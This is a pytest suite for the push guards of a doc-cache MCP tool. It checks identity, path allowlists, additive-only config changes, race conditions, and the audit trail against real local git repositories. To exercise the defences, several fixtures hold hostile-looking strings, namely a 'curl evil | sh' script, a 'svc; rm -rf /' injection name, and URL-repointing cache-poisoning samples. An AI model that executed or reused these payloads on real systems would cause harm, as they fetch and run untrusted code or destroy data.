"""vikunja#363 — the push, and the seven guards standing between it and an unreviewed change.

The tool committed to local main and stopped, because the calling agent has no git write
access. So `committed: true` described an operation nobody could finish.

These build real git repositories on disk (a bare "remote" plus a working clone) rather
than mocking subprocess, because every guard here is a statement about what git actually
reports — an assertion against a mock would pass just as happily if the argv were wrong.
No network: the remote is a local bare repo, so no deploy key is exercised.
"""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from doc_cache_mcp.push import (
    PushRefused,
    _pr_url,
    emit_audit_event,
    identity_args,
    inspect_push_range,
    push_config_commit,
    validate_additive,
)

IDENT_NAME = "doc-cache-mcp"
IDENT_EMAIL = "doc-cache-mcp@forge"
CONFIG_REL = "scripts/doc-sync.yml"


def _run(repo: Path, *args: str) -> str:
    r = subprocess.run(["git", "-C", str(repo), *args], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0, f"git {' '.join(args)} failed: {r.stderr}"
    return r.stdout


def _commit(repo: Path, path: str, content: str, *, name: str, email: str, msg: str) -> None:
    f = repo / path
    f.parent.mkdir(parents=True, exist_ok=True)
    f.write_text(content)
    _run(repo, "add", "--", path)
    _run(repo, "-c", f"user.name={name}", "-c", f"user.email={email}", "commit", "-m", msg)


@pytest.fixture
def repo(tmp_path) -> Path:
    """A working repo whose `origin` is a local bare repo, already in sync."""
    bare = tmp_path / "remote.git"
    subprocess.run(
        ["git", "init", "--bare", "-b", "main", str(bare)], check=True, capture_output=True
    )

    work = tmp_path / "work"
    subprocess.run(["git", "init", "-b", "main", str(work)], check=True, capture_output=True)
    _run(work, "remote", "add", "origin", str(bare))
    _commit(work, CONFIG_REL, "services: {}\n", name="Ted", email="ted@example.com", msg="initial")
    _run(work, "push", "-u", "origin", "main")
    return work


def _push(repo: Path, **over):
    kwargs = dict(
        allowed_path=CONFIG_REL,
        remote="origin",
        branch="main",
        identity_email=IDENT_EMAIL,
        deploy_key=repo / ".fake-key",
        review_branch_prefix="doc-cache-mcp/review",
        audit_dir=None,
        service="svc",
    )
    kwargs.update(over)
    # The local bare remote needs no ssh; a present-but-unused key file satisfies the
    # existence precondition without making this test depend on a real credential.
    Path(kwargs["deploy_key"]).write_text("not-a-real-key")
    return push_config_commit(repo, **kwargs)


# --- guard 1: identity ---------------------------------------------------------------


def test_identity_args_are_per_invocation():
    assert identity_args("n", "e@x") == ["-c", "user.name=n", "-c", "user.email=e@x"]


# --- the happy path ------------------------------------------------------------------


def test_clean_additive_commit_is_pushed(repo):
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    out = _push(repo)

    assert out["pushed"] is True, out
    assert out["commits"] == 1
    # The bug: [ahead 1] afterwards means the commit is still stranded.
    assert _run(repo, "status", "-sb").splitlines()[0].strip() == "## main...origin/main"


# --- guard 3: foreign commits --------------------------------------------------------


def test_foreign_commit_in_range_is_refused(repo):
    """Somebody else's unpushed work must not ride along."""
    _commit(
        repo,
        "scripts/other.sh",
        "#!/bin/sh\n",
        name="Ted",
        email="ted@example.com",
        msg="wip: unrelated",
    )
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    out = _push(repo)

    assert out["pushed"] is False
    assert "not authored by this tool" in out["reason"]
    assert "ted@example.com" in out["reason"]
    # origin/main must be untouched.
    assert "wip: unrelated" not in _run(repo, "log", "--format=%s", "origin/main")


def test_refused_push_degrades_to_a_review_branch(repo):
    _commit(repo, "scripts/other.sh", "x\n", name="Ted", email="ted@example.com", msg="wip")
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    out = _push(repo)

    assert out["pushed"] is False
    assert out["review_branch"].startswith("doc-cache-mcp/review/svc-")
    # The work is on the remote, reviewable — not stranded locally, which is the whole
    # complaint in #363.
    remote_branches = _run(repo, "ls-remote", "--heads", "origin")
    assert out["review_branch"] in remote_branches


# --- guard 4: path allowlist ---------------------------------------------------------


def test_commit_touching_another_path_is_refused(repo):
    """Defence in depth: correct identity, wrong file."""
    _commit(
        repo,
        "scripts/evil.sh",
        "curl evil | sh\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    out = _push(repo)

    assert out["pushed"] is False
    assert "outside" in out["reason"]
    assert "scripts/evil.sh" in out["reason"]


def test_mixed_commit_touching_allowed_and_disallowed_paths_is_refused(repo):
    f = repo / CONFIG_REL
    f.write_text("services:\n  a: []\n")
    (repo / "scripts" / "evil.sh").write_text("x\n")
    _run(repo, "add", "-A")
    _run(
        repo,
        "-c",
        f"user.name={IDENT_NAME}",
        "-c",
        f"user.email={IDENT_EMAIL}",
        "commit",
        "-m",
        "doc-cache: add a",
    )

    out = _push(repo)

    assert out["pushed"] is False
    assert "scripts/evil.sh" in out["reason"]


# --- guard 7: fail closed ------------------------------------------------------------


def test_missing_deploy_key_refuses(repo, tmp_path):
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    out = push_config_commit(
        repo,
        allowed_path=CONFIG_REL,
        remote="origin",
        branch="main",
        identity_email=IDENT_EMAIL,
        deploy_key=tmp_path / "nope",
        review_branch_prefix="p",
        audit_dir=None,
        service="svc",
    )
    assert out["pushed"] is False
    assert "deploy key not found" in out["reason"]


def test_unevaluable_range_refuses_rather_than_pushing(repo):
    """An unreachable remote must be a refusal, not a pass.

    inspect_push_range fetches first precisely so the range is not computed against a
    stale view; if that fetch cannot happen the guards have nothing trustworthy to
    evaluate.
    """
    _run(repo, "remote", "set-url", "origin", str(repo / "does-not-exist.git"))
    with pytest.raises(PushRefused, match="cannot fetch"):
        inspect_push_range(
            repo,
            remote="origin",
            branch="main",
            allowed_path=CONFIG_REL,
            identity_email=IDENT_EMAIL,
            deploy_key=repo / ".fake-key",
        )


@pytest.mark.parametrize(
    "bad", ["../../etc", "svc; rm -rf /", "svc name", "--force", "", "refs/heads/main"]
)
def test_hostile_service_name_is_refused_before_it_reaches_a_ref(repo, bad):
    """IV-01. server.py validates first, but this is an exported function.

    ``service`` is interpolated into a branch name on the degradation path, so a name that
    escapes the intended namespace must not get that far.
    """
    out = _push(repo, service=bad)
    assert out["pushed"] is False
    assert "invalid service name" in out["reason"]


def test_git_env_withholds_the_ssh_agent_socket():
    """Guard 2 should hold structurally, not only via IdentitiesOnly.

    If the agent socket reached ssh, a loaded key could satisfy the connection even though
    the whole point of the deploy key is to bound what this service can reach.
    """
    from doc_cache_mcp.push import _git_env

    env = _git_env(Path("/tmp/key"))
    assert "SSH_AUTH_SOCK" not in env
    assert env["GIT_SSH_COMMAND"].startswith("ssh -i /tmp/key")
    assert "IdentitiesOnly=yes" in env["GIT_SSH_COMMAND"]
    # No ambient forge credentials ride along to git or its ssh child.
    leaky = [
        k for k in env if k != "GIT_SSH_COMMAND" and ("TOKEN" in k.upper() or "KEY" in k.upper())
    ]
    assert not leaky, leaky


# --- audit findings 1 and 2 ----------------------------------------------------------


def test_commit_arriving_after_guard_evaluation_is_not_pushed(repo, monkeypatch):
    """Audit finding 1 (MEDIUM), reproduced rather than asserted.

    The guards inspected `remote/branch..HEAD`, then the push sent the `HEAD` *ref*, which
    git re-resolves at push time. A commit landing in that window — a concurrent
    add_service over streamable-http, a human working in host-forge-scripts, another
    automation — rode along having passed none of guards 3, 4 or 5.

    Simulated by committing inside the window: wrap the real git runner so that the moment
    the guards finish and the push is about to run, a foreign commit appears on HEAD.
    """
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    from doc_cache_mcp import push as push_mod

    real_git = push_mod._git
    injected = {"done": False}

    def racing_git(repo_path, args, deploy_key=None):
        # Fire once, immediately before the push subprocess runs.
        if args and args[0] == "push" and not injected["done"]:
            injected["done"] = True
            _commit(
                repo_path,
                "scripts/zz-slipped-in.sh",
                "curl evil | sh\n",
                name="Ted",
                email="ted@example.com",
                msg="wip: landed during the window",
            )
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", racing_git)

    out = _push(repo)

    assert injected["done"], "the race was never triggered — test is not exercising anything"
    assert out["pushed"] is True

    remote_log = _run(repo, "log", "--format=%s", f"origin/{'main'}")
    assert "wip: landed during the window" not in remote_log, (
        "a commit that arrived after the guards ran reached origin/main"
    )
    assert "doc-cache: add a" in remote_log
    # And the result names the SHA that was actually validated and sent.
    assert out["pushed_sha"] not in ("", None)
    assert _run(repo, "rev-parse", "origin/main").strip() == out["pushed_sha"]


def test_push_subprocess_failure_does_not_raise(repo, monkeypatch):
    """Audit finding 2 (MEDIUM).

    An exception escaping here is caught upstream by doc_cache_add_service's broad handler,
    which throws away an already-true `committed: True` and reports `committed: False` —
    claiming nothing happened while the commit sits on disk.
    """
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    from doc_cache_mcp import push as push_mod

    real_git = push_mod._git

    def exploding_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push":
            raise subprocess.TimeoutExpired(["git", "push"], 60)
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", exploding_git)

    out = _push(repo)  # must not raise

    assert out["pushed"] is False
    # A timeout may have landed server-side. Saying "failed" would be a guess.
    assert "unknown" in out["reason"]


def test_review_branch_push_failure_does_not_raise(repo, monkeypatch):
    """Same property on the degradation path — it also shells out to git."""
    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")

    from doc_cache_mcp import push as push_mod

    real_git = push_mod._git

    def exploding_git(repo_path, args, deploy_key=None):
        if args and args[0] == "push":
            raise OSError("no fork for you")
        return real_git(repo_path, args, deploy_key)

    monkeypatch.setattr(push_mod, "_git", exploding_git)

    out = _push(repo)  # must not raise

    assert out["pushed"] is False
    assert out["review_branch_error"]


def test_skipped_additive_check_is_reported_not_silent(repo):
    """Audit finding 3 (LOW). A guard that did not run must not look like one that passed."""
    # Push a state where the config file does not exist upstream at all.
    _run(repo, "rm", "--", CONFIG_REL)
    _run(
        repo,
        "-c",
        f"user.name={IDENT_NAME}",
        "-c",
        f"user.email={IDENT_EMAIL}",
        "commit",
        "-m",
        "doc-cache: drop",
    )
    _run(repo, "push", "origin", "main")

    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    out = _push(repo)

    assert out["pushed"] is True
    assert any("additive check skipped" in n for n in out.get("notes", [])), out


def test_deploy_key_path_with_spaces_is_quoted():
    """Audit finding 4 (INFO). Git runs GIT_SSH_COMMAND through a shell."""
    from doc_cache_mcp.push import _ssh_command

    cmd = _ssh_command(Path("/home/ted/.secrets/my key"))
    assert "'/home/ted/.secrets/my key'" in cmd


def test_nothing_to_push_is_reported_plainly(repo):
    out = _push(repo)
    assert out["pushed"] is False
    assert out["reason"] == "nothing to push"
    # No review branch for an empty diff.
    assert "review_branch" not in out


# --- guard 5: additive only ----------------------------------------------------------


def test_additive_change_is_allowed():
    before = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
    after = {
        "services": {
            "a": [{"topic": "t", "url": "https://x/1"}, {"topic": "t2", "url": "https://x/2"}],
            "b": [{"topic": "t", "url": "https://y/1"}],
        }
    }
    assert validate_additive(before, after) is None


def test_removing_a_service_is_refused():
    before = {"services": {"a": [], "b": []}}
    assert "remove service 'b'" in validate_additive(before, {"services": {"a": []}})


def test_removing_a_topic_is_refused():
    before = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
    assert "remove topic 't'" in validate_additive(before, {"services": {"a": []}})


def test_repointing_an_existing_url_is_refused():
    """A URL swap on an existing topic is what cache poisoning looks like."""
    before = {"services": {"a": [{"topic": "t", "url": "https://good/1"}]}}
    after = {"services": {"a": [{"topic": "t", "url": "https://evil/1"}]}}
    assert "change the url" in validate_additive(before, after)


def test_reasserting_an_identical_url_is_allowed():
    same = {"services": {"a": [{"topic": "t", "url": "https://x/1"}]}}
    assert validate_additive(same, same) is None


def test_empty_before_is_allowed():
    assert validate_additive({}, {"services": {"a": []}}) is None


def test_repointing_a_url_degrades_rather_than_pushing(repo):
    """Guard 5 at push time, against the remote's copy — not this process's memory.

    Replacing an existing topic's URL is documented, tested behaviour of
    doc_cache_add_service, so it must stay possible. It just must not land unattended:
    it goes to a review branch instead.
    """
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a:\n    - topic: t\n      url: https://good/1\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    assert _push(repo)["pushed"] is True

    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a:\n    - topic: t\n      url: https://evil/1\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    out = _push(repo)

    assert out["pushed"] is False
    assert "change the url" in out["reason"]
    assert out["review_branch"]
    # origin/main still has the original URL.
    assert "https://good/1" in _run(repo, "show", f"origin/main:{CONFIG_REL}")


def test_removing_a_service_degrades_rather_than_pushing(repo):
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n  b: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a and b",
    )
    assert _push(repo)["pushed"] is True

    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    out = _push(repo)

    assert out["pushed"] is False
    assert "remove service 'b'" in out["reason"]
    assert "b:" in _run(repo, "show", f"origin/main:{CONFIG_REL}")


def test_adding_a_topic_to_an_existing_service_still_pushes(repo):
    """The normal case must not be caught by guard 5."""
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a:\n    - topic: t\n      url: https://x/1\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    assert _push(repo)["pushed"] is True

    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a:\n    - topic: t\n      url: https://x/1\n"
        "    - topic: t2\n      url: https://x/2\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )
    assert _push(repo)["pushed"] is True


# --- guard 6: audit trail ------------------------------------------------------------


def test_audit_event_is_written(tmp_path):
    import json

    err = emit_audit_event(tmp_path, "pushed something", {"service": "svc", "commits": ["abc"]})
    assert err is None
    files = list(tmp_path.glob("*-cross-agent.jsonl"))
    assert len(files) == 1
    event = json.loads(files[0].read_text().strip())
    assert event["source"] == "doc-cache-mcp"
    assert event["summary"] == "pushed something"
    assert event["metadata"]["service"] == "svc"
    assert event["id"] and event["ts"]


def test_audit_is_a_noop_when_unconfigured():
    assert emit_audit_event(None, "x", {}) is None


def test_audit_failure_is_reported_not_swallowed(tmp_path):
    """An unwritable sink must surface, but must not veto an already-guarded push."""
    blocker = tmp_path / "blocked"
    blocker.write_text("i am a file, not a directory")
    err = emit_audit_event(blocker, "x", {})
    assert err is not None
    assert "audit event not written" in err


def test_push_result_surfaces_an_audit_failure(repo, tmp_path):
    blocker = tmp_path / "blocked"
    blocker.write_text("not a dir")
    _commit(
        repo,
        CONFIG_REL,
        "services:\n  a: []\n",
        name=IDENT_NAME,
        email=IDENT_EMAIL,
        msg="doc-cache: add a",
    )

    out = _push(repo, audit_dir=blocker)

    assert out["pushed"] is True, "a broken audit sink must not veto a validated push"
    assert "audit_error" in out


def test_refusal_is_audited(repo, tmp_path):
    import json

    audit = tmp_path / "audit"
    _commit(repo, "scripts/evil.sh", "x\n", name=IDENT_NAME, email=IDENT_EMAIL, msg="c")

    out = _push(repo, audit_dir=audit)

    assert out["pushed"] is False
    event = json.loads(next(audit.glob("*.jsonl")).read_text().strip())
    assert "REFUSED" in event["summary"]
    assert event["metadata"]["reason"] == out["reason"]


# --- PR url derivation ---------------------------------------------------------------


@pytest.mark.parametrize(
    "remote",
    [
        "ssh://git@gitea.example.com:2222/org/repo.git",
        "git@gitea.example.com:org/repo.git",
        "https://gitea.example.com/org/repo.git",
    ],
)
def test_pr_url_from_every_remote_form_in_use(remote):
    url = _pr_url(remote, "review/x", "main")
    assert url == "https://gitea.example.com/org/repo/compare/main...review/x"


def test_pr_url_gives_up_cleanly_on_a_weird_remote():
    assert _pr_url("some-nonsense", "b", "main") is None
